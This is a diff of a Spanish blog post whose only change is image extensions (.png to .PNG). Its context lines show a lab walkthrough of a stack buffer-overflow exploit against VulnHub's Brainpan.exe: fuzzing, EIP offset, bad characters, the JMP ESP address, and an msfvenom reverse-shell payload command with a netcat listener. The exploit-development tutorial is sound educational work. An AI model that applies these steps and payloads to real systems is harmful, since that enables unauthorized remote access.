@@ -5,7 +5,7 @@ excerpt: "Explotando un programa conocido de la plataforma de VulnHub basado en 
 date: 2021-05-06
 classes: wide
 header:
-    teaser: /assets/images/win32/portada.png
+    teaser: /assets/images/win32/portada.PNG
     teaser_home_page: true
 categories:
     - BoF
@@ -15,7 +15,7 @@ tags:
 ---
 
 <p align="center">
-<img src="/assets/images/wpa/portada.png" width="90%">
+<img src="/assets/images/wpa/portada.PNG" width="90%">
 </p>
 
 - [Herramientas Usadas](#herramientas-usadas)
@@ -66,25 +66,25 @@ while True:
 ```
 
 <p align="center">
-<img src="/assets/images/win32/24.png">
+<img src="/assets/images/win32/24.PNG">
 </p>
 
 El script anterior crea una cadena de caracteres de 100 A's en el búfer variable , intenta conectarse al host de Windows en el puerto 9999 y envía el búfer. Cuando termina, incrementa el búfer con 100 A's y luego intenta conectarse y enviar la cadena, que ahora es de 200 A nuevamente.  
 El fuzzer seguirá aumentando el búfer de A's cada vez que se ejecute hasta que ya no pueda conectarse al puerto 9999, lo que es una indicación de que la aplicación se bloqueó y ya no acepta conexiones.  
 Ejecutar el fuzzer con Python revela que ya no puede conectarse y muestra el mensaje de falla cuando envía alrededor de 600 bytes a la aplicación.
 <p align="center">
-<img src="/assets/images/win32/1.png">
+<img src="/assets/images/win32/1.PNG">
 </p>
 
 
 Si lo queremos ver gráficamente más didactico esto representariá mas o menos lo que está sucediendo por detrás en el programa. El programa crashea al sobreescribirse EIP por no saber a donde dirigirse.
 <p align="center">
-<img src="/assets/images/win32/15.png">
+<img src="/assets/images/win32/15.PNG">
 </p>
 
 También debería notar algo bastante interesante en Immunity Debugger.
 <p align="center">
-<img src="/assets/images/win32/2.png">
+<img src="/assets/images/win32/2.PNG">
 </p>
 
 ----
@@ -95,22 +95,22 @@ Todos los registros se han sobrescrito con 41 (hexadecimal para A). Esto signifi
 Ahora podemos usar un par de herramientas de ruby llamadas Pattern Create y Pattern Offset para encontrar la ubicación exacta de la sobrescritura. Pattern Create nos permite generar una cantidad cíclica de bytes, en función del número de bytes que especifiquemos. Luego podemos enviar esos bytes al programa, en lugar de A's, e intentar encontrar exactamente dónde sobrescribimos el EIP. Pattern Offset nos ayudará a determinar eso pronto.
 La herramienta y el comando que necesitamos ejecutar es: msf-pattern_create.rb -l 600 donde "l" es para longitud y "600" es para bytes.  
 <p align="center">
-<img src="/assets/images/win32/36.png">
+<img src="/assets/images/win32/36.PNG">
 </p>
 
 Ahora, vamos a necesitar modificar nuestro código para incluir todos los bytes que fueron generados por Pattern Create. Nuestro nuevo código debería verse así:
 <p align="center">
-<img src="/assets/images/win32/26.png">
+<img src="/assets/images/win32/26.PNG">
 </p>
 
 Donde la variable de buffer es una copia / pegado de la salida de Pattern Create. Notarás que cambié el código ligeramente. Ya no necesitamos ejecutar bucles, así que he puesto un comando try en su lugar. Solo necesitamos enviar este código una vez. Entonces, continuemos y reiniciemos Brainpan.exe en Immunity Debugger. Ahora, ejecute el código y vea lo que se devuelve:  
 <p align="center">
-<img src="/assets/images/win32/25.png">
+<img src="/assets/images/win32/25.PNG">
 </p>
 
 Observe que todavía sobrescribimos el programa. Todo aparece como antes, con Brainpan colapsando. Ahora, mire el EIP. El valor es **35724134**. Si lo ejecutamos correctamente, este valor es en realidad parte de nuestro código que generamos con Pattern Create. Intentemos usar Pattern Offset para averiguarlo. El comando que se debe escribir es  ```msf-pattern_offset -q 35724134```  donde 'q' es nuestro valor EIP.
 <p align="center">
-<img src="/assets/images/win32/28.png">
+<img src="/assets/images/win32/28.PNG">
 </p>
 
 Como puede ver, se encontró una coincidencia exacta en **524** bytes. Esta es una gran noticia. Ahora podemos intentar controlar el EIP, que será crítico más adelante en nuestro exploit.
@@ -143,7 +143,7 @@ except:
 
 Entonces, ahora la variable shellcode ha vuelto a un montón de A y cuatro B. Lo que estamos haciendo aquí es enviar 2003 A en un intento de alcanzar, pero no sobrescribir, el EIP. Luego estamos enviando cuatro B's, que deberían sobrescribir el EIP con 42424242. Recuerde, el EIP tiene una longitud de cuatro bytes, por lo que si lo sobrescribimos correctamente, tendremos el control total y nos encaminaremos hacia la raíz. Ejecutemos el código y echemos un vistazo:
 <p align="center">
-<img src="/assets/images/win32/4.png">
+<img src="/assets/images/win32/4.PNG">
 </p>
 
 Nuestro EIP dice "42424242" tal como lo esperábamos. Ahora, tenemos que investigar un poco cómo funciona Brainpan.exe y con qué caracteres de bytes es compatible para finalizar nuestro exploit.
@@ -152,17 +152,17 @@ Nuestro EIP dice "42424242" tal como lo esperábamos. Ahora, tenemos que investi
 Ciertos caracteres de bytes pueden causar problemas en el desarrollo de exploits. Debemos ejecutar cada byte a través del programa Brainpan.exe para ver si algún carácter causa problemas. De forma predeterminada, el byte nulo (x00) siempre se considera un carácter incorrecto, ya que truncará el código de shell cuando se ejecute. Para encontrar caracteres incorrectos podemos agregar una variable adicional de "badchars" a nuestro código que contiene una lista de cada carácter hexadecimal.
 Con el comando ```badchars -f python``` generamos lo generamos.  
 <p align="center">
-<img src="/assets/images/win32/30.png">
+<img src="/assets/images/win32/30.PNG">
 </p>
 
 Quedando nuestro script de esta forma.
 <p align="center">
-<img src="/assets/images/win32/31.png">
+<img src="/assets/images/win32/31.PNG">
 </p>
 
 Entonces, volvamos a cerrar y volver a abrir Brainpan e Immunity Debugger. Una vez enviemos el exploit, deberá hacer clic con el botón derecho en el registro ESP y seleccionar **Follow in Dump**. Debería notar un poco de movimiento en la esquina inferior izquierda del programa. Si observa con atención, debería ver todos sus bytes en orden comenzando con 01, 02, 03, etc. y terminando con FF. Si estuviera presente un mal personaje, parecería fuera de lugar. Afortunadamente para nosotros, no hay personajes malos en el programa Brainpan. Observe a continuación cómo todos nuestros números parecen perfectos y en orden
 <p align="center">
-<img src="/assets/images/win32/5.png">
+<img src="/assets/images/win32/5.PNG">
 </p>
 
 ----
@@ -171,19 +171,19 @@ Entonces, volvamos a cerrar y volver a abrir Brainpan e Immunity Debugger. Una v
 Ahora necesitamos encontrar alguna parte del programa que no tenga ningún tipo de protección de memoria. Las protecciones de la memoria, como DEP, ASLR y SafeSEH, pueden causar dolores de cabeza.
 Afortunadamente para nosotros nuevamente, Brainpan tiene un módulo que se ajusta a nuestros criterios. Para verlo por sí mismo, vuelva a abrir Brainpan e Immunity Debugger y luego escriba ```! Mona modules``` en la barra de búsqueda inferior de Immunity. Debería ver algunas opciones potenciales que se muestran.
 <p align="center">
-<img src="/assets/images/win32/7.png">
+<img src="/assets/images/win32/7.PNG">
 </p>
 
 Lo que estamos buscando es **Falso** en todos los ámbitos, preferiblemente. Eso significa que no hay protecciones de memoria presentes en el módulo. El módulo superior que llama la atención de inmediato. Parece que ```Brainpan.exe``` se ejecuta como parte del programa y no tiene protecciones de memoria. Anotemos el módulo  para el siguiente paso.
 Lo que tenemos que hacer ahora es encontrar el código de operación equivalente de JMP ESP. Estamos usando **JMP ESP** porque nuestro EIP apuntará a la ubicación de JMP ESP, que saltará a nuestro código de shell malicioso que inyectaremos más tarde. Encontrar el código de operación equivalente significa que estamos convirtiendo el lenguaje ensamblador en código hexadecimal. Hay una herramienta para hacer esto llamada nasm_shell.
 Haemos uso de la siguiente sintaxis luego escribimos ```JMP ESP``` y presione enter.  
 <p align="center">
-<img src="/assets/images/win32/32.png">
+<img src="/assets/images/win32/32.PNG">
 </p>
 
 Nuestro equivalente código de operación JMP ESP es **FFE4**. Ahora, podemos usar ```mona``` nuevamente para combinar esta nueva información con nuestro módulo previamente descubierto para encontrar nuestra dirección de puntero. La dirección del puntero es lo que colocaremos en el EIP para señalar nuestro código de shell malicioso. En nuestra barra de búsqueda de inmunity, escriba: ```!mona find -s "\\xff\\xe4" -m brainpan.exe```  y vea los resultados.
 <p align="center">
-<img src="/assets/images/win32/8.png">
+<img src="/assets/images/win32/8.PNG">
 </p>
 
 Lo que acabamos de generar es una lista de direcciones que potencialmente podemos usar como nuestro puntero. Las direcciones se encuentran en el lado izquierdo, en blanco. Voy a seleccionar la primera dirección, **311712F3**, y agregaré al código Python.  
@@ -213,7 +213,7 @@ Entonces, ahora reemplazamos nuestras cuatro B con nuestra dirección de retorno
 Ahora, debemos probar nuestra dirección de devolución. Nuevamente, con un Brainpan recién adjunto, necesitamos encontrar nuestra dirección de retorno en Immunity Debugger.
 Luego busque **311712F3** (o la dirección de retorno que encontró), en el mensaje “Ingrese la expresión a seguir”. Eso debería mostrar su dirección de retorno, FFE4, ubicación de JMP ESP. Una vez que lo haya encontrado, presione F2 y la dirección debería volverse azul celeste, lo que indica que hemos establecido un punto de interrupción.
 <p align="center">
-<img src="/assets/images/win32/9.png">
+<img src="/assets/images/win32/9.PNG">
 </p>
 
 Ahora, puede ejecutar su código y ver si se activa el punto de interrupción. Si nota que se activa en Immunity Debugger, ¡está en la recta final y listo para desarrollar su exploit!
@@ -221,7 +221,7 @@ Ahora, puede ejecutar su código y ver si se activa el punto de interrupción. S
 ## Generar el shellcode
 Ahora, podemos juntar toda la información que hemos reunido para generar shellcode malicioso. El shellcode le dirá a la máquina víctima que responda a nuestra máquina. Usando msfvenom, podemos proporcionar la siguiente sintaxis: ```msfvenom -p windows/shell_reverse_tcp LHOST = <IP>.address LPORT = 4444 EXITFUNC = thread -fc -a x86 –platform windows -b "\\x00"```
 <p align="center">
-<img src="/assets/images/win32/33.png">
+<img src="/assets/images/win32/33.PNG">
 </p>
 
 Como puede ver, generamos 351 bytes de shellcode. Necesitamos copiar y pegar este código de shell en nuestro script de Python. Así es como se ve el exploit final.
@@ -277,17 +277,17 @@ except:
 Entonces, he creado una variable llamada "exploit" y he colocado el shellcode malicioso dentro de ella. Puede notar que también he agregado **40 "\x90"** a la variable shellcode. Ésta es una práctica estándar. El byte x90 también se conoce como NOP, o sin operación. Literalmente no hace nada. Sin embargo, al desarrollar exploits, podemos usarlo como relleno. Hay casos en los que nuestro código de explotación puede interferir con nuestra dirección de retorno y no ejecutarse correctamente. Para evitar esta interferencia, podemos agregar algo de relleno entre los dos elementos.
 Ahora, configure un oyente de netcat en el puerto designado (4444 en mi ejemplo). Una vez que tenga netcat en ejecución, inicie Brainpan y ejecute su código de explotación. Si ha realizado todos los pasos correctamente, debería obtener acceso al sistema.  
 <p align="center">
-<img src="/assets/images/win32/34.png">
+<img src="/assets/images/win32/34.PNG">
 </p>
 
 Para comprobar que podemos ejecutar comandos creo una carpeta llamada 'hack'.
 <p align="center">
-<img src="/assets/images/win32/35.png">
+<img src="/assets/images/win32/35.PNG">
 </p>
 
 Y por otro lado en el sistema anfitrion tambien se visualizaria.
 <p align="center">
-<img src="/assets/images/win32/13.png">
+<img src="/assets/images/win32/13.PNG">
 </p>
 
 
